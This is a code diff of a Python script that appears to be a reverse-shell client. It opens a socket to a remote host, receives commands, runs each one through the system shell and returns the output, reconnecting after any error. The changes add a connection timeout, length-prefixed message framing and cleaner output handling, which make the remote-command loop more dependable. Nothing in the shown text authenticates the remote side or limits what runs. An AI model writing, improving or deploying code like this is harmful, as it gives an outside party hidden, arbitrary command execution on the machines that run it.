@@ -31,10 +31,12 @@ class Client:
         self.host = host
         self.port = port
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.client.settimeout(30)  # 30 second timeout
         self.client.connect((self.host, self.port))
 
-    def send(self: isinstance, data: bytes):
-        self.client.send(data)
+    def send(self, data: bytes):
+        length = struct.pack("!I", len(data))
+        self.client.sendall(length + data)
 
     def receive(self):
         raw_length = self.client.recv(4)
@@ -65,23 +67,26 @@ connect()
 
 while True:
     try:
-        command = client.receive().decode("utf-8")
+
+        command = client.receive()
 
         if command is None:
             continue
 
         output = subprocess.run(
-            command,
+            command.decode("utf-8"),
             shell=True,
             text=True,
             capture_output=True,
         )
-        output = output.stderr if output.stderr else output.stdout
+        output = (output.stderr or output.stdout or "").strip()
 
-        if output is None or output == "":
+        if not output:
             output = "Command executed successfully"
 
+        
         client.send(output.encode("utf-8"))
+       
     except Exception as e:
         client = None
         connect()
